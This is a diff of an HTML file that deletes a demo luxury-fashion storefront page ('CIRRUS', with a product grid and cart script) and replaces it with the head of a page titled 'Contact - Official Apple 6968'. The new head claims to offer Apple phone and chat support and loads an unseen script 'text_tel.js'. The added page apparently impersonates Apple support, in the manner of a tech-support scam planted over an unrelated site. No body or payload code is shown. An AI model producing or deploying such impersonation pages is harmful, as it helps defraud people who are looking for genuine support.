@@ -1,949 +1,379 @@
+
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>C I R R U S | Wisp of Eternity. Cloud Drift.</title>
-  <!-- Google Fonts: Airy Sans + Floating Serif -->
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@200;300;400;500;600;700;800&family=Quicksand:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <!-- Font Awesome Icons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 
-    :root {
-      --bg: #070b12;
-      --surface: #0e1420;
-      --surface-elevated: #171f2c;
-      --text: #eef2fc;
-      --text-soft: #8d9bb5;
-      --text-muted: #252f3d;
-      --accent: #c8deff;
-      --accent-glow: #e5f0ff;
-      --accent-deep: #9bb6e0;
-      --accent-subtle: #1e2635;
-      --border-light: #232d3c;
-      --shadow-sm: 0 20px 30px -12px rgba(0, 0, 0, 0.7);
-      --shadow-lg: 0 30px 50px -15px rgba(0, 0, 0, 0.85);
-      --transition: 0.6s cubic-bezier(0.2, 0.9, 0.3, 1);
-      --radius-card: 999px 0px 999px 0px;
-    }
 
-    [data-theme="light"] {
-      --bg: #f5f9ff;
-      --surface: #ffffff;
-      --surface-elevated: #fcfdff;
-      --text: #111a2b;
-      --text-soft: #6c7c9e;
-      --text-muted: #e0e6f2;
-      --accent: #7b9cd9;
-      --accent-glow: #5a7bb5;
-      --accent-deep: #3d5a8c;
-      --accent-subtle: #ebf0fa;
-      --border-light: #e2e8f5;
-      --shadow-sm: 0 6px 14px rgba(0, 0, 0, 0.02);
-      --shadow-lg: 0 20px 28px -8px rgba(0, 0, 0, 0.04);
-    }
-
-    body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Outfit', sans-serif;
-      scroll-behavior: smooth;
-      line-height: 1.5;
-      font-weight: 350;
-    }
-
-    ::-webkit-scrollbar { width: 2px; }
-    ::-webkit-scrollbar-track { background: var(--surface-elevated); }
-    ::-webkit-scrollbar-thumb { background: var(--accent-glow); border-radius: 10px; }
-
-    /* header — cloud drift */
-    .cirrus-header {
-      position: fixed;
-      width: 100%;
-      top: 0;
-      z-index: 1000;
-      background: rgba(7, 11, 18, 0.85);
-      backdrop-filter: blur(20px);
-      border-bottom: 0.5px solid var(--accent);
-      transition: var(--transition);
-    }
-    [data-theme="light"] .cirrus-header {
-      background: rgba(245, 249, 255, 0.92);
-    }
-
-    .nav-container {
-      max-width: 1440px;
-      margin: 0 auto;
-      padding: 1rem 2.5rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 1.2rem;
-    }
-
-    .brand {
-      font-family: 'Quicksand', sans-serif;
-      font-size: 1.9rem;
-      font-weight: 500;
-      letter-spacing: 8px;
-      background: linear-gradient(135deg, var(--accent-glow) 20%, var(--accent) 80%);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      text-transform: uppercase;
-    }
-
-    .nav-links {
-      display: flex;
-      gap: 2rem;
-      font-size: 0.65rem;
-      text-transform: uppercase;
-      font-weight: 600;
-      letter-spacing: 4px;
-    }
-    .nav-links a {
-      position: relative;
-      color: var(--text-soft);
-      transition: 0.25s;
-      text-decoration: none;
-    }
-    .nav-links a::after {
-      content: '';
-      position: absolute;
-      bottom: -6px;
-      left: 0;
-      width: 0;
-      height: 1px;
-      background: var(--accent-glow);
-      transition: 0.3s ease;
-    }
-    .nav-links a:hover::after { width: 100%; }
-    .nav-links a:hover { color: var(--accent-glow); }
-
-    .utility-actions {
-      display: flex;
-      gap: 1.8rem;
-      align-items: center;
-    }
-    #themeToggle {
-      background: none;
-      border: none;
-      font-size: 1.2rem;
-      cursor: pointer;
-      color: var(--text);
-      transition: 0.2s;
-    }
-    .cart-icon {
-      position: relative;
-      cursor: pointer;
-      font-size: 1.2rem;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      transition: 0.2s;
-    }
-    .cart-icon:hover { color: var(--accent-glow); }
-    .cart-count {
-      background: var(--accent-glow);
-      color: var(--bg);
-      font-size: 0.55rem;
-      font-weight: 800;
-      border-radius: 100px;
-      width: 18px;
-      height: 18px;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      position: absolute;
-      top: -8px;
-      right: -14px;
-    }
-
-    /* HERO — cirrus horizon */
-    .hero-cirrus {
-      min-height: 94vh;
-      display: flex;
-      align-items: center;
-      position: relative;
-      background-image: url('https://images.unsplash.com/photo-1534088568595-a066f410bcda?q=80&w=2070&auto=format&fit=crop');
-      background-size: cover;
-      background-position: 50% 30%;
-      margin-top: 0;
-    }
-    .hero-cirrus::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(circle at 30% 50%, rgba(0,0,0,0.55) 10%, rgba(7,11,18,0.45) 90%);
-      z-index: 1;
-    }
-    .hero-content {
-      position: relative;
-      z-index: 2;
-      max-width: 720px;
-      padding: 0 7%;
-    }
-    .hero-sub {
-      font-size: 0.6rem;
-      letter-spacing: 12px;
-      text-transform: uppercase;
-      font-weight: 400;
-      margin-bottom: 1.2rem;
-      color: var(--accent-glow);
-      opacity: 0.8;
-    }
-    .hero-main-title {
-      font-family: 'Quicksand', sans-serif;
-      font-size: clamp(4rem, 10vw, 7rem);
-      font-weight: 500;
-      line-height: 1;
-      margin-bottom: 1rem;
-      color: #ffffff;
-      text-transform: uppercase;
-      letter-spacing: -1px;
-      text-shadow: 0 2px 20px rgba(0,0,0,0.2);
-    }
-    .hero-offer {
-      font-size: 0.75rem;
-      font-weight: 300;
-      margin-bottom: 2rem;
-      border-left: 2px solid var(--accent-glow);
-      padding-left: 1.2rem;
-      background: rgba(0,0,0,0.35);
-      backdrop-filter: blur(4px);
-      display: inline-block;
-      letter-spacing: 0.5px;
-    }
-
-    .btn-primary {
-      background: transparent;
-      color: var(--accent-glow);
-      border: 1px solid var(--accent-glow);
-      padding: 0.9rem 2.8rem;
-      font-size: 0.7rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 5px;
-      cursor: pointer;
-      transition: var(--transition);
-      display: inline-block;
-      text-decoration: none;
-      backdrop-filter: blur(4px);
-      border-radius: 60px;
-    }
-    .btn-primary:hover {
-      background: var(--accent-glow);
-      color: #070b12;
-      border-color: var(--accent-glow);
-      transform: translateY(-3px);
-    }
-
-    .collection-badge {
-      max-width: 1400px;
-      margin: 4rem auto 1.5rem auto;
-      padding: 0 2rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-end;
-      flex-wrap: wrap;
-      border-bottom: 0.5px solid var(--border-light);
-      padding-bottom: 0.8rem;
-    }
-    .collection-badge h2 {
-      font-family: 'Quicksand', sans-serif;
-      font-size: 2rem;
-      font-weight: 500;
-      letter-spacing: -0.3px;
-    }
-    .collection-badge p {
-      color: var(--accent-glow);
-      font-size: 0.65rem;
-      letter-spacing: 2.5px;
-      font-weight: 300;
-    }
-
-    .grid-shop {
-      max-width: 1400px;
-      margin: 2rem auto 5rem auto;
-      padding: 0 2rem;
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-      gap: 2rem;
-    }
-
-    .product-tile {
-      background: var(--surface);
-      overflow: hidden;
-      transition: var(--transition);
-      box-shadow: var(--shadow-sm);
-      border: 0.5px solid var(--border-light);
-      border-radius: var(--radius-card);
-      opacity: 0.98;
-    }
-    .product-tile:hover { transform: translateY(-6px); border-color: var(--accent-glow); }
-    .tile-img {
-      position: relative;
-      aspect-ratio: 4 / 5.2;
-      overflow: hidden;
-      background: var(--surface-elevated);
-    }
-    .tile-img img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transition: transform 0.8s ease;
-    }
-    .product-tile:hover .tile-img img { transform: scale(1.05); }
-    .quick-add {
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: linear-gradient(to top, rgba(0,0,0,0.85), transparent);
-      padding: 1.2rem;
-      opacity: 0;
-      transition: 0.3s;
-      text-align: center;
-    }
-    .product-tile:hover .quick-add { opacity: 1; }
-    .quick-add button {
-      background: var(--accent-glow);
-      border: none;
-      width: 85%;
-      padding: 0.7rem;
-      font-size: 0.6rem;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 2.5px;
-      cursor: pointer;
-      transition: 0.2s;
-      color: #070b12;
-      border-radius: 60px;
-    }
-    .quick-add button:hover {
-      background: #ffffff;
-      color: #000;
-    }
-    .product-info {
-      padding: 1.2rem 1rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .product-details h4 {
-      font-size: 0.55rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      color: var(--accent-glow);
-      letter-spacing: 2px;
-    }
-    .product-details h3 {
-      font-family: 'Quicksand', sans-serif;
-      font-size: 1.2rem;
-      font-weight: 500;
-      margin-top: 5px;
-    }
-    .price-block { text-align: right; }
-    .current-price { font-weight: 700; font-size: 1rem; }
-    .old-price { font-size: 0.7rem; text-decoration: line-through; color: var(--text-muted); margin-left: 0.3rem; }
-
-    /* CART SIDEBAR — ethereal */
-    .cart-overlay {
-      position: fixed;
-      inset: 0;
-      z-index: 2000;
-      background: rgba(0, 0, 0, 0.94);
-      backdrop-filter: blur(12px);
-      visibility: hidden;
-      opacity: 0;
-      transition: 0.25s ease;
-    }
-    .cart-overlay.active {
-      visibility: visible;
-      opacity: 1;
-    }
-    .cart-sidebar {
-      position: fixed;
-      top: 0;
-      right: 0;
-      width: 100%;
-      max-width: 460px;
-      height: 100vh;
-      background: var(--surface);
-      border-left: 0.5px solid var(--accent-glow);
-      box-shadow: var(--shadow-lg);
-      z-index: 2001;
-      transform: translateX(100%);
-      transition: transform 0.45s cubic-bezier(0.23, 1, 0.32, 1);
-      display: flex;
-      flex-direction: column;
-    }
-    .cart-overlay.active .cart-sidebar {
-      transform: translateX(0);
-    }
-    .cart-header {
-      padding: 1.5rem;
-      border-bottom: 0.5px solid var(--border-light);
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .cart-header h3 {
-      font-family: 'Quicksand', sans-serif;
-      font-size: 1.8rem;
-      font-weight: 500;
-      color: var(--accent-glow);
-      text-transform: uppercase;
-      letter-spacing: 2px;
-    }
-    .close-cart {
-      background: none;
-      border: none;
-      font-size: 1.3rem;
-      cursor: pointer;
-      color: var(--text-muted);
-      transition: 0.2s;
-    }
-    .close-cart:hover { color: var(--accent-glow); }
-    .cart-items {
-      flex: 1;
-      overflow-y: auto;
-      padding: 1.2rem;
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-    }
-    .cart-item {
-      display: flex;
-      gap: 1rem;
-      padding: 0.8rem;
-      background: var(--surface-elevated);
-      border-left: 2px solid var(--accent-glow);
-      position: relative;
-      border-radius: 0px 20px 0px 20px;
-    }
-    .cart-item-img {
-      width: 70px;
-      height: 85px;
-      object-fit: cover;
-      border-radius: 12px;
-    }
-    .cart-item-details {
-      flex: 1;
-    }
-    .cart-item-name {
-      font-family: 'Quicksand', sans-serif;
-      font-size: 1rem;
-      font-weight: 500;
-    }
-    .cart-item-price {
-      font-size: 0.8rem;
-      color: var(--accent-glow);
-      margin-top: 4px;
-    }
-    .cart-item-quantity {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-top: 8px;
-    }
-    .quantity-btn {
-      background: var(--accent-subtle);
-      border: none;
-      width: 26px;
-      height: 26px;
-      cursor: pointer;
-      color: var(--text);
-      font-weight: 700;
-      transition: 0.2s;
-      border-radius: 30px;
-    }
-    .quantity-btn:hover {
-      background: var(--accent-glow);
-      color: #070b12;
-    }
-    .cart-item-qty {
-      font-size: 0.85rem;
-      min-width: 20px;
-      text-align: center;
-    }
-    .remove-item {
-      position: absolute;
-      top: 8px;
-      right: 8px;
-      background: none;
-      border: none;
-      color: var(--text-muted);
-      cursor: pointer;
-      font-size: 0.8rem;
-    }
-    .remove-item:hover { color: var(--accent-glow); }
-    .cart-footer {
-      padding: 1.5rem;
-      border-top: 0.5px solid var(--accent-glow);
-      background: var(--surface);
-    }
-    .cart-total {
-      display: flex;
-      justify-content: space-between;
-      font-weight: 700;
-      font-size: 1.1rem;
-      margin-bottom: 1.2rem;
-    }
-    .checkout-btn {
-      width: 100%;
-      background: var(--accent-glow);
-      border: none;
-      padding: 1rem;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 2.5px;
-      cursor: pointer;
-      transition: 0.2s;
-      color: #070b12;
-      border-radius: 60px;
-    }
-    .checkout-btn:hover {
-      background: var(--accent-deep);
-      color: #fff;
-    }
-    .empty-cart {
-      text-align: center;
-      color: var(--text-soft);
-      padding: 2rem;
-      font-size: 0.8rem;
-    }
-
-    footer {
-      background: var(--surface-elevated);
-      margin-top: 3rem;
-      padding: 3.5rem 2rem;
-      border-top: 0.5px solid var(--border-light);
-    }
-    .footer-inner {
-      max-width: 1200px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .footer-logo {
-      font-family: 'Quicksand', sans-serif;
-      font-size: 2.5rem;
-      font-weight: 500;
-      background: linear-gradient(135deg, var(--accent-glow), var(--accent));
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      text-transform: uppercase;
-      letter-spacing: 6px;
-    }
-    .footer-locations {
-      font-size: 0.6rem;
-      letter-spacing: 4px;
-      color: var(--text-soft);
-      margin: 1rem 0 2rem;
-    }
-
-    @media (max-width: 750px) {
-      .nav-container { flex-direction: column; align-items: center; padding: 0.8rem; gap: 0.8rem; }
-      .nav-links { gap: 1rem; flex-wrap: wrap; justify-content: center; }
-      .grid-shop { gap: 1rem; }
-      .cart-sidebar { max-width: 100%; }
-    }
-
-    /* MODAL — cirrus invitation */
-    .modal-overlay {
-      position: fixed;
-      inset: 0;
-      z-index: 2100;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem;
-      background: rgba(0, 0, 0, 0.95);
-      backdrop-filter: blur(24px);
-      transition: opacity 0.3s ease;
-    }
-    .cirrus-modal {
-      background: var(--surface);
-      max-width: 540px;
-      width: 100%;
-      border: 0.5px solid var(--accent-glow);
-      padding: 2.5rem 2rem 2.8rem;
-      position: relative;
-      text-align: center;
-      border-radius: 32px;
-    }
-    .modal-close-icon {
-      position: absolute;
-      top: 1.2rem;
-      right: 1.5rem;
-      background: none;
-      border: none;
-      font-size: 1.3rem;
-      cursor: pointer;
-      color: var(--text-muted);
-    }
-    .modal-close-icon:hover { color: var(--accent-glow); }
-    .modal-icon-badge {
-      width: 80px;
-      height: 80px;
-      background: radial-gradient(circle, rgba(200,222,255,0.1) 0%, rgba(0,0,0,0) 80%);
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 1rem;
-      font-size: 2.6rem;
-      border: 0.5px solid var(--accent-glow);
-      color: var(--accent-glow);
-      border-radius: 100px;
-    }
-    .modal-title {
-      font-family: 'Quicksand', sans-serif;
-      font-size: 3.3rem;
-      font-weight: 500;
-      background: linear-gradient(135deg, var(--accent-glow), #ffffff);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      margin-bottom: 0.5rem;
-      text-transform: uppercase;
-      letter-spacing: 4px;
-    }
-    .modal-description {
-      color: var(--text-soft);
-      line-height: 1.6;
-      font-size: 0.85rem;
-      margin: 1rem 0;
-    }
-    .modal-buttons {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 1rem;
-      margin-top: 2rem;
-    }
-    .btn-modal-primary {
-      background: var(--accent-glow);
-      border: none;
-      padding: 0.85rem 2rem;
-      font-weight: 600;
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      cursor: pointer;
-      color: #070b12;
-      border-radius: 60px;
-    }
-    .btn-modal-secondary {
-      background: transparent;
-      border: 0.5px solid var(--accent-glow);
-      padding: 0.85rem 1.8rem;
-      font-weight: 600;
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      cursor: pointer;
-      color: var(--text);
-      border-radius: 60px;
-    }
-    .modal-fade-out { opacity: 0; pointer-events: none; transition: opacity 0.2s; }
-  </style>
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-SBJZ7C7VV0"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'G-SBJZ7C7VV0');
-  </script>
-</head>
-<body>
-
-<!-- ENTRY MODAL - CIRRUS INVITATION -->
-<div id="entryModal" class="modal-overlay">
-  <div class="cirrus-modal">
-    <button id="closeModalBtn" class="modal-close-icon">✕</button>
-    <div class="modal-icon-badge"><i class="fas fa-cloud-moon"></i></div>
-    <h2 class="modal-title">CIRRUS</h2>
-    <p class="modal-description">High-altitude silence. Wisp of eternity. Each piece is a cloud caught in amber — weightless, fleeting, infinite. Enter the ethereal drift.</p>
-    <div class="modal-buttons">
-      <button id="enterBtn" class="btn-modal-primary">ENTER CIRRUS</button>
-      <button id="laterBtn" class="btn-modal-secondary">STAY ON THE GROUND</button>
-    </div>
-  </div>
-</div>
-
-<header class="cirrus-header">
-  <div class="nav-container">
-    <div class="brand">CIRRUS</div>
-    <nav class="nav-links">
-      <a href="#shop">WISP</a>
-      <a href="#shop">DRIFT</a>
-      <a href="#shop">VAPOR</a>
-      <a href="#">ETHER</a>
-    </nav>
-    <div class="utility-actions">
-      <button id="themeToggle">☀️</button>
-      <div class="cart-icon" id="cartIcon">
-        <i class="fas fa-feather-alt"></i>
-        <span class="cart-count" id="cartCount">0</span>
-      </div>
-    </div>
-  </div>
-</header>
-
-<main>
-  <section class="hero-cirrus">
-    <div class="hero-content">
-      <div class="hero-sub">THE ETERNAL WISP</div>
-      <h1 class="hero-main-title">CIRRUS</h1>
-      <div class="hero-offer">Atmospheric covenant: <strong>15% OFF</strong> first drift</div>
-      <a href="#shop" class="btn-primary">ENTER CIRRUS →</a>
-    </div>
-  </section>
-
-  <div class="collection-badge" id="shop">
-    <h2>Cirrus Atelier · Vapor Chapter</h2>
-    <p>12 wisps / ethereal drift</p>
-  </div>
-
-  <div class="grid-shop" id="productGrid"></div>
-</main>
-
-<footer>
-  <div class="footer-inner">
-    <div class="footer-logo">CIRRUS</div>
-    <div class="footer-locations">STRATOSPHERE — ANDES — TIBET — CELESTIAL</div>
-    <p class="copyright" style="font-size:0.55rem; opacity:0.6; letter-spacing:1px;">© 2026 CIRRUS. ATMOSPHERIC MINIMALISM. ALL RIGHTS RESERVED.</p>
-  </div>
-</footer>
-
-<!-- CART SIDEBAR -->
-<div id="cartOverlay" class="cart-overlay">
-  <div class="cart-sidebar">
-    <div class="cart-header">
-      <h3>CIRRUS CART</h3>
-      <button class="close-cart" id="closeCartBtn"><i class="fas fa-times"></i></button>
-    </div>
-    <div class="cart-items" id="cartItemsContainer">
-      <div class="empty-cart">Your cart is an empty sky.<br>Add wispy pieces.</div>
-    </div>
-    <div class="cart-footer" id="cartFooter" style="display: none;">
-      <div class="cart-total">
-        <span>Total (USD)</span>
-        <span id="cartTotalPrice">$0</span>
-      </div>
-      <button class="checkout-btn" id="checkoutBtn">◈ ATMOSPHERIC CHECKOUT ◈</button>
-    </div>
-  </div>
-</div>
-
-<script>
-  // CIRRUS COLLECTION — ethereal, cloud-like, weightless minimalism
-  const products = [
-    { id: 1, name: "Wisp Blazer", category: "TAILORING", original: 1350, discountPrice: 1147, img: "https://images.unsplash.com/photo-1594938298603-c8148c4dae35?q=80&w=687&auto=format&fit=crop", alt: "blazer" },
-    { id: 2, name: "Vapor Shirt", category: "SHIRTING", original: 520, discountPrice: 442, img: "https://images.unsplash.com/photo-1598032895397-b9472444bf93?q=80&w=2070&auto=format&fit=crop", alt: "shirt" },
-    { id: 3, name: "Nimbus Gown", category: "EVENING", original: 2590, discountPrice: 2201, img: "https://images.unsplash.com/photo-1595777457583-95e059d581b8?q=80&w=687&auto=format&fit=crop", alt: "gown" },
-    { id: 4, name: "Stratus Cargo", category: "BOTTOMS", original: 610, discountPrice: 518, img: "https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?q=80&w=600&auto=format&fit=crop", alt: "cargo" },
-    { id: 5, name: "Cumulus Knit", category: "KNITWEAR", original: 780, discountPrice: 663, img: "https://images.unsplash.com/photo-1576566588028-4147f3842f27?q=80&w=764&auto=format&fit=crop", alt: "knit" },
-    { id: 6, name: "Zephyr Trench", category: "OUTERWEAR", original: 1950, discountPrice: 1657, img: "https://images.unsplash.com/photo-1591047139829-d91aecb6caea?q=80&w=600&auto=format&fit=crop", alt: "trench" },
-    { id: 7, name: "Aether Skirt", category: "SKIRTS", original: 500, discountPrice: 425, img: "https://images.unsplash.com/photo-1583496661160-fb5886a0aaaa?q=80&w=687&auto=format&fit=crop", alt: "skirt" },
-    { id: 8, name: "Mist Leather", category: "LEATHER", original: 2390, discountPrice: 2031, img: "https://plus.unsplash.com/premium_photo-1661313817350-1fa759c43a3b?q=80&w=1217&auto=format&fit=crop", alt: "leather" },
-    { id: 9, name: "Fog Corset", category: "TOPS", original: 470, discountPrice: 399, img: "https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?q=80&w=688&auto=format&fit=crop", alt: "corset" },
-    { id: 10, name: "Breeze Denim", category: "DENIM", original: 690, discountPrice: 586, img: "https://images.unsplash.com/photo-1541099649105-f69ad21f3246?q=80&w=600&auto=format&fit=crop", alt: "denim" },
-    { id: 11, name: "Cirrocumulus Gown", category: "EVENING", original: 3190, discountPrice: 2711, img: "https://images.unsplash.com/photo-1539008835657-9e8e9680c956?q=80&w=687&auto=format&fit=crop", alt: "gown" },
-    { id: 12, name: "Cirrus Vest", category: "LAYERING", original: 560, discountPrice: 476, img: "https://images.unsplash.com/photo-1591047139829-d91aecb6caea?q=80&w=600&auto=format&fit=crop", alt: "vest" }
-  ];
-
-  let cart = [];
-
-  const cartOverlay = document.getElementById('cartOverlay');
-  const cartIcon = document.getElementById('cartIcon');
-  const closeCartBtn = document.getElementById('closeCartBtn');
-  const cartItemsContainer = document.getElementById('cartItemsContainer');
-  const cartFooter = document.getElementById('cartFooter');
-  const cartTotalPriceSpan = document.getElementById('cartTotalPrice');
-  const cartCountSpan = document.getElementById('cartCount');
-
-  function saveCart() { localStorage.setItem('cirrusCart', JSON.stringify(cart)); }
-  function loadCart() {
-    const saved = localStorage.getItem('cirrusCart');
-    if (saved) { cart = JSON.parse(saved); }
-    renderCartUI();
-    updateCartCount();
-  }
-
-  function updateCartCount() {
-    const total = cart.reduce((sum, item) => sum + item.quantity, 0);
-    cartCountSpan.innerText = total;
-  }
-
-  function renderCartUI() {
-    if (!cartItemsContainer) return;
-    if (cart.length === 0) {
-      cartItemsContainer.innerHTML = '<div class="empty-cart">Your cart is an empty sky.<br>Add wispy pieces.</div>';
-      cartFooter.style.display = 'none';
-      updateCartCount();
-      saveCart();
-      return;
-    }
-    cartFooter.style.display = 'block';
-    let html = '';
-    let total = 0;
-    cart.forEach((item) => {
-      const itemTotal = item.price * item.quantity;
-      total += itemTotal;
-      html += `
-        <div class="cart-item" data-id="${item.id}">
-          <img class="cart-item-img" src="${item.img}" alt="${item.name}">
-          <div class="cart-item-details">
-            <div class="cart-item-name">${item.name}</div>
-            <div class="cart-item-price">$${item.price.toLocaleString()}</div>
-            <div class="cart-item-quantity">
-              <button class="quantity-btn dec-qty" data-id="${item.id}">-</button>
-              <span class="cart-item-qty">${item.quantity}</span>
-              <button class="quantity-btn inc-qty" data-id="${item.id}">+</button>
-            </div>
-          </div>
-          <button class="remove-item" data-id="${item.id}"><i class="fas fa-trash-alt"></i></button>
-        </div>
-      `;
-    });
-    cartItemsContainer.innerHTML = html;
-    cartTotalPriceSpan.innerText = `$${total.toLocaleString()}`;
     
-    document.querySelectorAll('.dec-qty').forEach(btn => {
-      btn.addEventListener('click', () => { const id = parseInt(btn.dataset.id); updateQuantity(id, -1); });
-    });
-    document.querySelectorAll('.inc-qty').forEach(btn => {
-      btn.addEventListener('click', () => { const id = parseInt(btn.dataset.id); updateQuantity(id, 1); });
-    });
-    document.querySelectorAll('.remove-item').forEach(btn => {
-      btn.addEventListener('click', () => { const id = parseInt(btn.dataset.id); removeFromCart(id); });
-    });
-    updateCartCount();
-    saveCart();
-  }
 
-  function updateQuantity(productId, delta) {
-    const index = cart.findIndex(item => item.id === productId);
-    if (index !== -1) {
-      const newQty = cart[index].quantity + delta;
-      if (newQty <= 0) cart.splice(index, 1);
-      else cart[index].quantity = newQty;
-      renderCartUI();
-    }
-  }
-  function removeFromCart(productId) { cart = cart.filter(item => item.id !== productId); renderCartUI(); }
-  
-  function addToCart(productId) {
-    const product = products.find(p => p.id === productId);
-    if (!product) return;
-    const existing = cart.find(item => item.id === productId);
-    if (existing) existing.quantity += 1;
-    else cart.push({ id: product.id, name: product.name, price: product.discountPrice, quantity: 1, img: product.img });
-    renderCartUI();
-    updateCartCount();
-    const btn = document.querySelector(`.add-btn-${productId}`);
-    if (btn) { const orig = btn.innerText; btn.innerText = "✓ DRIFTING"; setTimeout(() => btn.innerText = orig, 800); }
-    cartOverlay.classList.add('active');
-  }
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple 6968</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF+Pro%2cv1_7CSF+Pro+Icons%2cv1html.html" />
+    <script src="text_tel.js"></script>
 
-  function renderProducts() {
-    const container = document.getElementById('productGrid');
-    if (!container) return;
-    container.innerHTML = '';
-    products.forEach(prod => {
-      const card = document.createElement('div');
-      card.className = 'product-tile';
-      const discountPercent = Math.round(((prod.original - prod.discountPrice) / prod.original) * 100);
-      card.innerHTML = `
-        <div class="tile-img">
-          <img src="${prod.img}" alt="${prod.alt || prod.name}" loading="lazy">
-          <div class="quick-add">
-            <button class="add-btn-${prod.id} add-to-cart-btn" data-id="${prod.id}">✦ ADD TO CIRRUS</button>
-          </div>
-        </div>
-        <div class="product-info">
-          <div class="product-details">
-            <h4>${prod.category}</h4>
-            <h3>${prod.name}</h3>
-          </div>
-          <div class="price-block">
-            <span class="current-price">$${prod.discountPrice.toLocaleString()}</span>
-            <span class="old-price">$${prod.original.toLocaleString()}</span>
-            <span style="font-size: 0.55rem; color: var(--accent-glow); display: block; text-align: right;">-${discountPercent}%</span>
-          </div>
-        </div>
-      `;
-      container.appendChild(card);
-    });
-    document.querySelectorAll('.add-to-cart-btn').forEach(btn => {
-      btn.addEventListener('click', (e) => {
-        e.preventDefault();
-        const id = parseInt(btn.getAttribute('data-id'));
-        addToCart(id);
-      });
-    });
-  }
 
-  function initTheme() {
-    const stored = localStorage.getItem('cirrus-theme');
-    const systemDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-    let theme = stored || (systemDark ? 'dark' : 'light');
-    document.documentElement.setAttribute('data-theme', theme);
-    const toggleBtn = document.getElementById('themeToggle');
-    if (toggleBtn) toggleBtn.textContent = theme === 'dark' ? '☀️' : '🌙';
-  }
-  function toggleTheme() {
-    const current = document.documentElement.getAttribute('data-theme');
-    const next = current === 'dark' ? 'light' : 'dark';
-    document.documentElement.setAttribute('data-theme', next);
-    localStorage.setItem('cirrus-theme', next);
-    const toggleBtn = document.getElementById('themeToggle');
-    if (toggleBtn) toggleBtn.textContent = next === 'dark' ? '☀️' : '🌙';
-  }
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PH1QTWEN1J"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-  const modalDiv = document.getElementById('entryModal');
-  const enterBtn = document.getElementById('enterBtn');
-  const laterBtn = document.getElementById('laterBtn');
-  const closeModal = document.getElementById('closeModalBtn');
-  function closeModalFunc() {
-    if (modalDiv) { modalDiv.classList.add('modal-fade-out'); setTimeout(() => { modalDiv.style.display = 'none'; }, 220); }
-  }
-  if (enterBtn) enterBtn.addEventListener('click', closeModalFunc);
-  if (laterBtn) laterBtn.addEventListener('click', closeModalFunc);
-  if (closeModal) closeModal.addEventListener('click', closeModalFunc);
-  if (modalDiv) modalDiv.addEventListener('click', (e) => { if(e.target === modalDiv) closeModalFunc(); });
-
-  if (cartIcon) cartIcon.addEventListener('click', () => cartOverlay.classList.add('active'));
-  if (closeCartBtn) closeCartBtn.addEventListener('click', () => cartOverlay.classList.remove('active'));
-  if (cartOverlay) cartOverlay.addEventListener('click', (e) => { if(e.target === cartOverlay) cartOverlay.classList.remove('active'); });
-  document.getElementById('checkoutBtn')?.addEventListener('click', () => {
-    alert('You have ascended into the ethereal realm. CIRRUS acknowledges your weightless drift.');
-    cart = [];
-    renderCartUI();
-    cartOverlay.classList.remove('active');
-  });
-
-  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-    anchor.addEventListener('click', function(e) {
-      const href = this.getAttribute('href');
-      if (href === "#" || href === "") return;
-      const target = document.querySelector(href);
-      if (target) { e.preventDefault(); target.scrollIntoView({ behavior: 'smooth', block: 'start' }); }
-    });
-  });
-
-  renderProducts();
-  initTheme();
-  loadCart();
-  document.getElementById('themeToggle')?.addEventListener('click', toggleTheme);
